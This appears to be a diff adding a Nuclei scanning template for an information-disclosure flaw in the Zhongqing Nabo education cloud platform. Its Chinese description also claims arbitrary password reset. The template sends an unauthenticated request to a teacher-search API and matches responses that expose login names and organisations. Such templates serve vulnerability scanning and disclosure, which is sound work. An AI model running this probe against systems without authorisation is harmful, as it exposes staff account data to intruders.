@@ -1,0 +1,34 @@
+id: zhongqina-SearchTeacherInSiteWithPagerRecords-weak
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 北京中庆纳博信息技术有限公司，简称中庆纳博，是有20年历史的中庆集团旗下核心企业，专注于教育信息化的深度应用领域。产品以教育软件为主，核心产品为“中庆教育云”平台。公司成立三年多来，客户已遍及全国各地，“中庆教育云”亦成为业内的知名品牌，该系统api接口存在信息泄露，并且可以进行任意密码重置。
+  reference:
+    - http://wiki.fofamini.com/%E6%BC%8F%E6%B4%9E%E5%BA%93/Web%E5%AE%89%E5%85%A8/%E4%B8%AD%E5%BA%86%E7%BA%B3%E5%8D%9A%E6%9F%90%E7%B3%BB%E7%BB%9F/%E4%B8%AD%E5%BA%86%E7%BA%B3%E5%8D%9A%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /api/TeacherQuery/SearchTeacherInSiteWithPagerRecords HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'LoginName'
+      - type: word
+        part: body
+        words:
+          - 'OrgName'
